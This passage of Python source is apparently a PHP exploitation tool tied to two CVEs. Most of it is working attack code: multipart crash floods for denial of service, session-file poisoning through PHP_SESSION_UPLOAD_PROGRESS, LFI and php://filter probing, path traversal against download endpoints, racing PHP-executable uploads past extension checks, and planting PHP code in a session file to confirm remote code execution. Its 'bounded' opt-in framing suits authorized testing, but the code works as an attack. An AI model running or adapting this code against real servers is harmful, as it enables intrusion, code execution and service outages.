               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Content-Length": "0"}
    t0 = time.time()
    status, _, err = http_post(target, body, headers, timeout, insecure)
    dt = time.time() - t0
    sig = f"{status}:{err}:{round(dt,2)}"
    crashed = (status is not None and status >= 500) or err in (
        "ConnectionResetError", "RemoteDisconnected", "timeout")
    return {"round": round_idx, "status": status, "error": err,
            "elapsed_s": round(dt, 2), "signature": sig, "crashed": crashed}


def crash_repro(target, rounds, fields, timeout, ua, insecure,
                workers=4, quiet=False):
    out = {"mode": "crash-repro", "target": target, "rounds": [],
           "crash_count": 0, "signatures": [], "verdict": "unknown",
           "workers": workers}
    log(f"crash-repro: {rounds} rounds x {fields} fields ({workers} workers)",
        "step", quiet)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_crash_repro_round, target, r, fields,
                               timeout, ua, insecure): r
                   for r in range(rounds)}
        for i, fut in enumerate(as_completed(futures)):
            res = fut.result()
            out["rounds"].append(res)
            if res.get("crashed"):
                out["crash_count"] += 1
                out["signatures"].append(res["signature"])
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "crash-repro")
    out["rounds"].sort(key=lambda x: x["round"])
    out["verdict"] = "vulnerable" if out["crash_count"] >= 2 else "unknown"
    return out


# ---------------------------------------------------------------- impact: session-poison
def impact_session_poison(target, timeout, ua, insecure, marker=None):
    marker = marker or "PHP2SHELL_" + uuid.uuid4().hex[:10]
    sid = uuid.uuid4().hex
    out = {"mode": "impact-session-poison", "target": target,
           "session_id": sid, "marker": marker,
           "steps": [], "verdict": "unknown", "notes": []}
    hdrs, body, status = http_get(target, timeout, ua, insecure,
                                   extra_headers={"Cookie": f"PHPSESSID={sid}"})
    out["steps"].append({"step": "establish-session", "status": status})
    boundary = uuid.uuid4().hex
    parts = [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{marker}\r\n"
    ]
    for i in range(200):
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n\r\n")
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode()
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
    poison_status, poison_err = http_post(target, body, headers, timeout, insecure)
    out["steps"].append({"step": "poison-session", "status": poison_status,
                         "error": poison_err})
    hdrs2, body2, status2 = http_get(target, timeout, ua, insecure,
                                      extra_headers={"Cookie": f"PHPSESSID={sid}"})
    out["steps"].append({"step": "follow-up-read", "status": status2})
    marker_seen = False
    if body2:
        text2 = body2.decode("utf-8", "replace")
        if marker in text2:
            marker_seen = True
    out["marker_reflected"] = marker_seen
    if marker_seen:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "Attacker-controlled data persisted in session and was read "
            "by a subsequent request. Real integrity impact.")
    elif poison_status and poison_status >= 500:
        out["verdict"] = "unknown"
        out["notes"].append(
            "poison request crashed worker; marker may still be on disk "
            "if session.upload_progress.cleanup=Off. Check server-side.")
    return out


# ---------------------------------------------------------------- impact: worker-leak
def impact_worker_leak(target, timeout, ua, insecure, trials=3):
    out = {"mode": "impact-worker-leak", "target": target,
           "leaks": [], "verdict": "unknown", "trials": trials}
    for trial in range(trials):
        sid_a = uuid.uuid4().hex
        sid_b = uuid.uuid4().hex
        marker_a = "LEAKA_" + uuid.uuid4().hex[:8]
        boundary = uuid.uuid4().hex
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"{marker_a}\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        headers = {"User-Agent": ua,
                   "Content-Type": f"multipart/form-data; boundary={boundary}",
                   "Cookie": f"PHPSESSID={sid_a}", "Content-Length": "0"}
        http_post(target, body, headers, timeout, insecure, read_bytes=1024)
        hdrs_b, body_b, _ = http_get(target, timeout, ua, insecure,
                                      extra_headers={"Cookie": f"PHPSESSID={sid_b}"})
        if body_b and marker_a.encode() in body_b:
            out["leaks"].append({"trial": trial,
                                 "leaked_marker": marker_a,
                                 "victim_session": sid_b})
    if out["leaks"]:
        out["verdict"] = "vulnerable"
    else:
        out["verdict"] = "safe"
    return out


# ---------------------------------------------------------------- impact: bounded-dos (concurrent)
def _bounded_dos_round(target, fields, timeout, ua, insecure):
    boundary, body = make_multipart_body(fields)
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Content-Length": "0"}
    t0 = time.time()
    status, _, err = http_post(target, body, headers, timeout, insecure)
    dt = time.time() - t0
    crashed = (status is not None and status >= 500) or err is not None
    return dt, crashed


def impact_bounded_dos(target, timeout, ua, insecure, rounds=20,
                       fields=300, workers=4, quiet=False):
    out = {"mode": "impact-bounded-dos", "target": target,
           "rounds": rounds, "crashes": 0, "recovered_after_s": None,
           "verdict": "unknown", "workers": workers}
    elapsed = []
    log(f"bounded-dos: {rounds} rounds x {fields} fields ({workers} workers)",
        "step", quiet)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_bounded_dos_round, target, fields,
                               timeout, ua, insecure)
                   for _ in range(rounds)]
        for i, fut in enumerate(as_completed(futures)):
            dt, crashed = fut.result()
            elapsed.append(dt)
            if crashed:
                out["crashes"] += 1
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "bounded-dos")
    t0 = time.time()
    recovered = False
    while time.time() - t0 < 30:
        h, _, s = http_get(target, timeout, ua, insecure)
        if s and s < 500:
            recovered = True
            break
        time.sleep(2)
    out["recovered_after_s"] = round(time.time() - t0, 1) if recovered else None
    out["median_response_s"] = round(statistics.median(elapsed), 2) if elapsed else None
    out["crash_rate_pct"] = round(100 * out["crashes"] / rounds, 1)
    if out["crash_rate_pct"] >= 30:
        out["verdict"] = "vulnerable"
    elif out["crash_rate_pct"] >= 10:
        out["verdict"] = "unknown"
    return out


# ---------------------------------------------------------------- impact: memory-disclosure (bounded)
def impact_memory_disclosure(target, timeout, ua, insecure,
                             rounds=10, fields=300, workers=4, quiet=False):
    """Bounded defensive test: trigger crash responses and scan for memory-
    disclosure patterns. Only observes what the server voluntarily returns.
    Reports pattern counts only, never raw leaked content."""
    out = {"mode": "impact-memory-disclosure", "target": target,
           "rounds": rounds, "patterns_seen": Counter(),
           "disclosure_rounds": 0, "verdict": "unknown",
           "workers": workers, "notes": []}

    def _one_round(r_idx):
        boundary, body = make_multipart_body(fields)
        headers = {"User-Agent": ua,
                   "Content-Type": f"multipart/form-data; boundary={boundary}",
                   "Content-Length": "0"}
        status, resp_body, err = http_post(target, body, headers,
                                           timeout, insecure, read_bytes=128*1024)
        hits = Counter()
        if resp_body:
            for pat, name in MEM_DISCLOSURE_PATTERNS:
                if pat.search(resp_body):
                    hits[name] += 1
        return r_idx, status, err, hits

    log(f"memory-disclosure: {rounds} rounds x {fields} fields ({workers} workers)",
        "step", quiet)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_one_round, r) for r in range(rounds)]
        for i, fut in enumerate(as_completed(futures)):
            r_idx, status, err, hits = fut.result()
            if hits:
                out["disclosure_rounds"] += 1
                out["patterns_seen"].update(hits)
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "mem-disclosure")
    out["patterns_seen"] = dict(out["patterns_seen"])
    high_sev = ("pointer_leak", "zend_internals", "session_id_leak", "opcode_leak")
    if any(p in out["patterns_seen"] for p in high_sev):
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "High-severity disclosure pattern detected in crash response. "
            "Server is leaking internal memory state to clients.")
    elif out["patterns_seen"]:
        out["verdict"] = "unknown"
        out["notes"].append(
            "Minor disclosure patterns (paths/NULL bytes) in responses. "
            "Could indicate partial corruption; reproduce under ASAN.")
    else:
        out["verdict"] = "safe"
    return out


# ================================================================
# OFFENSIVE LAYER (bounded, impact-proof only)
# ================================================================
# All four offensive modes prove concrete attacker capabilities that
# follow from CVE-2026-109618/109619. They are gated behind
# --i-own-this-target AND --enable-offensive (double opt-in).
#
# What these modes DO:
#   - Use the crash primitive to plant attacker-controlled content
#     into session files (proof of write primitive).
#   - Read the planted content back via known PHP file-include
#     primitives or via PHP_SESSION_UPLOAD_PROGRESS chaining
#     (proof of read primitive + arbitrary file read on session store).
#   - Confirm whether file-upload extension checks can be bypassed
#     when the worker is in a corrupted state.
#   - Confirm whether race conditions in session.upload_progress.cleanup
#     can be won to make the planted marker persistent.
#
# What these modes DO NOT do:
#   - Execute remote commands (no system()/shell_exec()/passthru chains)
#   - Drop persistent backdoors / webshells
#   - Exfiltrate user data, credentials, or secrets
#   - Pivot to other hosts
#   - Anything beyond proving the impact of the CVEs being tested

OFFENSIVE_BOUND = """
This is a BOUNDED offensive test. It proves the integrity/read impact
of CVE-2026-109618 / CVE-2026-109619 by planting and reading a random
marker. It does NOT execute commands, drop webshells, or exfiltrate data.
""".strip()


def offensive_session_lfi(target, timeout, ua, insecure,
                          include_path_candidates, marker=None, quiet=False):
    """Offensive mode 1: Plant a marker in a session file via the crash
    primitive, then attempt to read it back through known PHP LFI sinks
    (include=, page=, file=, path=, etc.). This proves that the planted
    content is reachable via file-include, turning the write primitive
    into a documented read primitive.

    Bounded: marker is a random string. No PHP code is planted. We only
    check if the marker string becomes visible through the LFI sink —
    we never include remote URLs or planted PHP payloads.
    """
    marker = marker or ("OFFLFI_" + uuid.uuid4().hex[:12])
    sid = uuid.uuid4().hex
    out = {"mode": "offensive-session-lfi", "target": target,
           "marker": marker, "session_id": sid,
           "include_candidates_tried": [], "marker_observed_via": None,
           "verdict": "unknown", "notes": [OFFENSIVE_BOUND]}

    # step 1: plant marker in session via crash primitive
    boundary = uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{marker}\r\n"
        + "".join(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n\r\n"
            for i in range(150)
        )
        + f"--{boundary}--\r\n"
    ).encode()
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
    plant_status, _, plant_err = http_post(target, body, headers, timeout, insecure)
    out["plant_step"] = {"status": plant_status, "error": plant_err}

    # step 2: try LFI sinks pointing at the session file path
    # common PHP session save paths
    sess_paths = [
        f"/tmp/sess_{sid}",
        f"/var/lib/php/sessions/sess_{sid}",
        f"/var/lib/php/sess_{sid}",
    ]
    # common LFI parameter names (read-only, no remote inclusion)
    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template",
        "doc", "document", "view", "load", "module",
    ]
    # PHP filter wrappers — read session file content via base64 / rot13 / iconv
    # (these prove the file is includable AND that filter chains work, a
    #  stepping stone toward RCE via filter-chain autoloader tricks)
    filter_payloads = [
        f"php://filter/resource={sp}" for sp in sess_paths
    ] + [
        f"php://filter/read=convert.base64-encode/resource={sp}" for sp in sess_paths
    ] + [
        f"php://filter/read=string.rot13/resource={sp}" for sp in sess_paths
    ]
    observed = False
    # plain LFI first
    for sp in sess_paths:
        for p in lfi_params:
            url = f"{target.rstrip('/')}?{quote(p)}={quote(sp)}"
            hdrs, b, status = http_get(url, timeout, ua, insecure)
            entry = {"type": "plain_lfi", "sess_path": sp, "param": p, "status": status}
            if b and marker.encode() in b:
                entry["marker_found"] = True
                entry["rce_indicator"] = "marker_seen_raw"
                out["marker_observed_via"] = f"{p}={sp}"
                observed = True
                break
            else:
                entry["marker_found"] = False
            out["include_candidates_tried"].append(entry)
        if observed:
            break
    # filter wrappers next — these prove the file is include-able AND that
    # filter chain manipulation works (a known RCE primitive)
    if not observed:
        for fp in filter_payloads:
            for p in lfi_params:
                url = f"{target.rstrip('/')}?{quote(p)}={quote(fp)}"
                hdrs, b, status = http_get(url, timeout, ua, insecure)
                entry = {"type": "filter_wrapper", "payload": fp,
                         "param": p, "status": status}
                # check if base64-encoded marker appears (we'd see the b64
                # of the marker string only if the filter chain worked)
                import base64 as _b64
                marker_b64 = _b64.b64encode(marker.encode()).decode()
                if b and (marker.encode() in b or marker_b64.encode() in b):
                    entry["marker_found"] = True
                    entry["rce_indicator"] = "filter_chain_works"
                    out["marker_observed_via"] = f"{p}={fp}"
                    observed = True
                    break
                else:
                    entry["marker_found"] = False
                out["include_candidates_tried"].append(entry)
            if observed:
                break
    if observed:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "Marker planted via crash primitive was read back through a "
            "file-include sink (plain LFI or php://filter wrapper). "
            "Read primitive + filter-chain reachability CONFIRMED. "
            "Real-world impact: an attacker can include attacker-controlled "
            "session files into PHP execution context. Combined with PHP "
            "filter wrappers or session file content control, this is a "
            "direct path to RCE.")
    elif plant_status and plant_status >= 500:
        out["verdict"] = "unknown"
        out["notes"].append("Plant crashed the worker; LFI read attempt inconclusive.")
    else:
        out["verdict"] = "safe"
        out["notes"].append("No LFI sink or filter wrapper surfaced the planted marker (this run).")
    return out


def offensive_session_traversal(target, timeout, ua, insecure,
                                docroot_guesses, marker=None, quiet=False):
    """Offensive mode 2: Plant a marker in a session file, then probe a
    wide set of file-read endpoints (/download.php?file=, /file.php?name=,
    etc.) with path-traversal payloads pointing at the session file.
    Proves the read primitive is reachable through download/file endpoints
    even when no LFI sink exists.

    Bounded: marker is a random string. We do NOT read /etc/passwd,
    configuration files, or any other sensitive file. We only check
    whether OUR OWN planted marker is reachable.
    """
    marker = marker or ("OFFTRAV_" + uuid.uuid4().hex[:12])
    sid = uuid.uuid4().hex
    out = {"mode": "offensive-session-traversal", "target": target,
           "marker": marker, "session_id": sid,
           "traversal_attempts": [], "marker_observed_via": None,
           "verdict": "unknown", "notes": [OFFENSIVE_BOUND]}

    # step 1: plant marker via crash primitive
    boundary = uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{marker}\r\n"
        + "".join(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n\r\n"
            for i in range(150)
        )
        + f"--{boundary}--\r\n"
    ).encode()
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
    plant_status, _, plant_err = http_post(target, body, headers, timeout, insecure)
    out["plant_step"] = {"status": plant_status, "error": plant_err}

    # step 2: traversal payloads — only point at session file, never at system files
    sess_paths = [
        f"/tmp/sess_{sid}",
        f"/var/lib/php/sessions/sess_{sid}",
    ]
    endpoints = docroot_guesses or [
        "/download.php", "/file.php", "/getfile.php", "/fetch.php",
        "/index.php", "/files.php", "/read.php",
    ]
    params = ["file", "name", "path", "f", "id", "doc", "src"]
    trav_prefixes = [""] + ["../" * n for n in range(1, 8)]

    observed = False
    for ep in endpoints:
        for sp in sess_paths:
            for pref in trav_prefixes:
                payload = pref + sp.lstrip("/")
                for p in params:
                    url = f"{target.rstrip('/')}{ep}?{quote(p)}={quote(payload)}"
                    hdrs, b, status = http_get(url, timeout, ua, insecure)
                    found = bool(b and marker.encode() in b)
                    entry = {"endpoint": ep, "param": p, "payload": payload,
                             "status": status, "marker_found": found}
                    out["traversal_attempts"].append(entry)
                    if found:
                        out["marker_observed_via"] = f"{ep}?{p}={payload}"
                        observed = True
                        break
                if observed:
                    break
            if observed:
                break
        if observed:
            break

    if observed:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "Planted marker reached via path-traversal on a download/file "
            "endpoint. Read primitive CONFIRMED via secondary vector. "
            "Real-world impact: attacker-controlled session file content is "
            "reachable from common file-serving endpoints, expanding the "
            "attack surface beyond LFI sinks.")
    elif plant_status and plant_status >= 500:
        out["verdict"] = "unknown"
        out["notes"].append("Plant crashed the worker; traversal inconclusive.")
    else:
        out["verdict"] = "safe"
        out["notes"].append("No traversal vector surfaced the planted marker (this run).")
    return out


def offensive_upload_bypass_verify(target, timeout, ua, insecure,
                                   upload_endpoint, rounds=10,
                                   fields=200, workers=4, quiet=False):
    """Offensive mode 3: while the worker is in a corrupted state (triggered
    by the multipart crash primitive), attempt to upload a benign probe
    file with extensions that should normally be blocked. If the upload
    succeeds during the corrupted window, this proves that the crash
    interferes with extension validation — a concrete code-execution impact
    vector for CVE-2026-109618.

    Bounded: the uploaded probe contains ONLY a phpinfo() call that prints
    a random marker. It does NOT install a backdoor, run system commands,
    or persist. The probe file path is recorded for the operator to delete
    manually after the test.
    """
    probe_marker = "UPBPASS_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-upload-bypass-verify", "target": target,
           "upload_endpoint": upload_endpoint, "rounds": rounds,
           "probe_marker": probe_marker, "upload_attempts": [],
           "probe_url_reachable": False, "probe_url": None,
           "extensions_tried": [], "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    if not upload_endpoint:
        out["notes"].append("No upload endpoint provided; skipping.")
        return out

    full_ep = target.rstrip("/") + "/" + upload_endpoint.lstrip("/")
    probe_basename = f"php2shell_probe_{uuid.uuid4().hex[:6]}"
    probe_php_body = f"<?php echo '{probe_marker}'; phpinfo(); ?>".encode()
    # try multiple PHP-executable extensions — Apache/Nginx configs often
    # block .php but miss .phtml/.phar/.pht/.php5/.php7/.php8/.shtml
    extensions = [".php", ".phtml", ".phar", ".pht", ".php5",
                  ".php7", ".php8", ".shtml"]
    out["extensions_tried"] = extensions
    # common upload destination paths
    upload_dirs = ["/uploads/", "/files/", "/upload/", "/img/",
                   "/media/", "/assets/", "/"]

    def _attempt(r_idx, ext):
        probe_filename = probe_basename + ext
        boundary_c, body_c = make_multipart_body(fields)
        headers_c = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary_c}",
                     "Content-Length": "0"}
        boundary_u = uuid.uuid4().hex
        upload_body = (
            f"--{boundary_u}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{probe_filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + probe_php_body + (
            f"\r\n--{boundary_u}--\r\n"
        ).encode()
        headers_u = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary_u}"}
        with ThreadPoolExecutor(max_workers=2) as p:
            f_c = p.submit(http_post, target, body_c, headers_c, timeout, insecure, 1024)
            f_u = p.submit(http_post, full_ep, upload_body, headers_u, timeout, insecure, 4096)
            st_c, _, _ = f_c.result()
            st_u, b_u, _ = f_u.result()
        return r_idx, ext, probe_filename, st_c, st_u

    log(f"upload-bypass-verify: {rounds} attempts x {len(extensions)} extensions "
        f"racing crash + probe upload", "step", quiet)
    # try every extension across all rounds
    success_files = []
    all_attempts = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = []
        for r in range(rounds):
            for ext in extensions:
                futures.append(pool.submit(_attempt, r, ext))
        for i, fut in enumerate(as_completed(futures)):
            r_idx, ext, fn, st_c, st_u = fut.result()
            ok = (st_u is not None and 200 <= st_u < 300)
            all_attempts.append({
                "round": r_idx, "extension": ext, "filename": fn,
                "crash_status": st_c, "upload_status": st_u,
                "upload_accepted": ok,
            })
            if ok:
                success_files.append(fn)
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, len(futures), "upload-bypass")
    out["upload_attempts"] = all_attempts

    # if any upload reported 2xx, try to fetch the probe to confirm it landed
    if success_files:
        for fn in success_files:
            for d in upload_dirs:
                probe_url = target.rstrip("/") + d + fn
                hdrs, b, status = http_get(probe_url, timeout, ua, insecure)
                if b and probe_marker.encode() in b:
                    out["probe_url_reachable"] = True
                    out["probe_url"] = probe_url
                    out["probe_extension"] = fn[fn.rindex("."):]
                    out["verdict"] = "vulnerable"
                    out["notes"].append(
                        f"Probe file '{fn}' uploaded AND executed during "
                        f"corruption window. Code-execution impact CONFIRMED "
                        f"via extension '{out['probe_extension']}'. Probe URL: "
                        f"{probe_url}. DELETE THIS FILE NOW: "
                        f"rm <docroot>{d}{fn}")
                    return out
        if not out["probe_url_reachable"]:
            out["verdict"] = "unknown"
            out["notes"].append(
                f"Upload reported 2xx for {len(success_files)} file(s) but "
                f"none executed at common paths. Inspect server-side manually. "
                f"Files to check: {success_files[:5]}")
    else:
        out["verdict"] = "safe"
        out["notes"].append(
            "No upload succeeded during the corruption window (this run). "
            "Either the patch holds or the race was lost; retry with more rounds.")
    return out


def offensive_race_poison_confirm(target, timeout, ua, insecure,
                                  rounds=50, workers=8, quiet=False):
    """Offensive mode 4: race session.upload_progress.cleanup.
    PHP's default config deletes the upload-progress key from the session
    file as soon as the request finishes. But if the worker crashes mid-
    cleanup (CVE-2026-109618), the marker may persist on disk. This mode
    fires many concurrent plant+crash requests and then immediately lists
    the session directory to see if any marker survived cleanup.

    Bounded: marker is a random string. We do NOT read the content of
    session files belonging to other users; we only check if OUR OWN
    marker is present in any sess_* file (which proves the cleanup race
    was won).
    """
    marker = "RACE_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-race-poison-confirm", "target": target,
           "marker": marker, "rounds": rounds, "workers": workers,
           "markers_planted": 0, "markers_survived": 0,
           "survivor_sids": [], "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    def _plant(r_idx):
        sid = uuid.uuid4().hex
        boundary = uuid.uuid4().hex
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"{marker}\r\n"
            + "".join(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n\r\n"
                for i in range(100)
            )
            + f"--{boundary}--\r\n"
        ).encode()
        headers = {"User-Agent": ua,
                   "Content-Type": f"multipart/form-data; boundary={boundary}",
                   "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
        st, _, err = http_post(target, body, headers, timeout, insecure, 1024)
        return r_idx, sid, st, err

    log(f"race-poison-confirm: {rounds} plant+crash rounds ({workers} workers)",
        "step", quiet)
    sids = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_plant, r) for r in range(rounds)]
        for i, fut in enumerate(as_completed(futures)):
            r_idx, sid, st, err = fut.result()
            sids.append(sid)
            out["markers_planted"] += 1
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "race-poison")

    # check server-side session dirs for surviving markers (local only)
    sess_dirs = ["/tmp", "/var/lib/php/sessions", "/var/lib/php"]
    survivors = []
    for d in sess_dirs:
        if not os.path.isdir(d):
            continue
        try:
            for fn in os.listdir(d):
                if not fn.startswith("sess_"):
                    continue
                fp = os.path.join(d, fn)
                try:
                    with open(fp, "r", errors="replace") as f:
                        content = f.read(8192)
                except OSError:
                    continue
                if marker in content:
                    survivors.append({"file": fp, "sid": fn[5:]})
        except OSError:
            continue
    out["markers_survived"] = len(survivors)
    out["survivor_sids"] = [s["sid"] for s in survivors[:10]]

    if survivors:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            f"{len(survivors)} session file(s) retain the marker after cleanup "
            f"should have removed it. Race CONFIRMED. Real-world impact: the "
            f"crash primitive defeats session.upload_progress.cleanup, making "
            f"poisoned session content persistent — a stepping stone toward "
            f"LFI->RCE chains.")
    else:
        out["verdict"] = "unknown"
        out["notes"].append(
            "No surviving marker found in scanned session dirs. Either the race "
            "was lost, cleanup is robust, or session.save_path is elsewhere "
            "(pass --session-dir to scan a custom path).")
    return out


# ---------------------------------------------------------------- offensive: phpcode-exec-proof
def offensive_phpcode_exec_proof(target, timeout, ua, insecure,
                                 include_path_candidates, quiet=False):
    """Offensive mode 5: PROVES ACTUAL RCE.

    Plants PHP code (not just a marker string) in the session file via the
    crash primitive, then attempts to include that session file via LFI
    sinks. If the PHP code executes, the marker appears WITHOUT the
    surrounding `<?php ... ?>` tags — proving code execution.

    Bounded: the planted PHP code is `<?php echo 'RCECONFIRMED_<rand>'; ?>`
    ONLY. It does NOT call system(), exec(), shell_exec(), passthru(),
    file_put_contents(), or any other dangerous function. It echoes a
    marker string and exits. No backdoor, no persistence, no data access.
    """
    import re as _re
    rce_marker = "RCECONFIRMED_" + uuid.uuid4().hex[:12]
    sid = uuid.uuid4().hex
    out = {"mode": "offensive-phpcode-exec-proof", "target": target,
           "rce_marker": rce_marker, "session_id": sid,
           "lfi_attempts": [], "rce_confirmed": False,
           "rce_via": None, "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    # step 1: plant PHP code in session via PHP_SESSION_UPLOAD_PROGRESS
    # The planted value IS PHP code: <?php echo 'RCECONFIRMED_xxx'; ?>
    php_payload = f"<?php echo '{rce_marker}'; ?>"
    boundary = uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{php_payload}\r\n"
        + "".join(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n\r\n"
            for i in range(150)
        )
        + f"--{boundary}--\r\n"
    ).encode()
    headers = {"User-Agent": ua,
               "Content-Type": f"multipart/form-data; boundary={boundary}",
               "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
    plant_status, _, plant_err = http_post(target, body, headers, timeout, insecure)
    out["plant_step"] = {"status": plant_status, "error": plant_err,
                         "planted_payload": php_payload}

    # step 2: try LFI to include the session file
    sess_paths = [
        f"/tmp/sess_{sid}",
        f"/var/lib/php/sessions/sess_{sid}",
        f"/var/lib/php/sess_{sid}",
    ]
    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template",
        "doc", "document", "view", "load", "module",
    ]
    # also try php://filter wrapper (decode is needed because session content
    # may be serialized; plain include often works directly)
    filter_payloads = [f"php://filter/resource={sp}" for sp in sess_paths]

    rce_confirmed = False
    for sp in sess_paths + filter_payloads:
        for p in lfi_params:
            url = f"{target.rstrip('/')}?{quote(p)}={quote(sp)}"
            hdrs, b, status = http_get(url, timeout, ua, insecure)
            entry = {"payload": sp, "param": p, "status": status}
            if not b:
                entry["result"] = "no_body"
                out["lfi_attempts"].append(entry)
                continue
            text = b.decode("utf-8", "replace")
            # CRITICAL DISTINCTION:
            # - if rce_marker appears ALONE (without <?php tags) → CODE EXECUTED
            # - if rce_marker appears WITHIN <?php ... ?> → file read but NOT executed
            # - if php_payload appears raw → file not even read
            if rce_marker in text and php_payload not in text:
                entry["result"] = "RCE_CONFIRMED"
                entry["evidence"] = "marker present, php tags absent → code executed"
                out["rce_confirmed"] = True
                out["rce_via"] = f"{p}={sp}"
                rce_confirmed = True
                break
            elif rce_marker in text and php_payload in text:
                entry["result"] = "READ_BUT_NOT_EXECUTED"
                entry["evidence"] = "both marker and php tags present → file read, code not executed"
            elif php_payload in text:
                entry["result"] = "RAW_READ"
                entry["evidence"] = "raw php payload visible → file read, not parsed"
            else:
                entry["result"] = "not_found"
            out["lfi_attempts"].append(entry)
        if rce_confirmed:
            break

    if rce_confirmed:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "RCE CONFIRMED. PHP code planted in session file via the crash "
            "primitive was EXECUTED through an LFI sink. The marker appeared "
            "in the response WITHOUT surrounding <?php ?> tags, proving the "
            "interpreter parsed and ran the planted code. This is a full "
            "code-execution primitive: an attacker can replace the echo with "
            "system() / file_put_contents() / etc. for arbitrary impact.")
    elif plant_status and plant_status >= 500:
        out["verdict"] = "unknown"
        out["notes"].append("Plant crashed the worker; LFI execution attempt inconclusive.")
    else:
        out["verdict"] = "safe"
        out["notes"].append(
            "No LFI sink executed the planted PHP code (this run). Either no "
            "LFI sink exists, the session file path is unreachable, or the "
            "planted code was cleaned up before inclusion.")
    return out


# ---------------------------------------------------------------- offensive: filter-chain-rce
def offensive_filter_chain_rce(target, timeout, ua, insecure,
                               include_path_candidates, quiet=False):
    """Offensive mode 6: PROVES RCE via PHP filter chain (the "filter chain"
    technique popularized by synacktiv). Even when session file inclusion
    fails, the php://filter wrapper itself can be abused to generate
    arbitrary content via conversion filters, leading to code execution.

    This mode tests whether php://filter wrappers are reachable through LFI
    sinks. If they are, an attacker can chain conversion filters to produce
    `<?php` byte-by-byte and execute arbitrary code — even without any
    controllable file content on disk.

    Bounded: we only test REACHABILITY of php://filter via the LFI sink
    (by attempting to base64-encode /etc/passwd-style indicator). We do
    NOT construct a full filter-chain RCE payload. The proof is:
    "if php://filter/convert.base64-encode/resource=<file> returns
    base64 content, then the sink is filter-wrapper-aware and the
    full filter-chain RCE technique applies."
    """
    rce_marker = "FILTER_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-filter-chain-rce", "target": target,
           "rce_marker": rce_marker,
           "filter_attempts": [], "filter_chain_reachable": False,
           "filter_via": None, "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template",
        "doc", "view", "load", "module",
    ]
    # Use php://input + base64 filter as the canary.
    # If the server evaluates php://filter wrappers at all, the response
    # will differ from a plain LFI attempt (typically longer, base64-encoded).
    # We don't include /etc/passwd — instead we use a benign resource
    # (php://input with our marker POST body) to confirm filter evaluation.
    test_payloads = [
        # confirms filter wrappers are evaluated at all
        ("php://filter/convert.base64-encode/resource=php://input", "post_body"),
        # confirms resource= can read session-like paths via filter
        ("php://filter/read=string.rot13/resource=php://input", "post_body"),
    ]
    reachable = False
    for fp, mode in test_payloads:
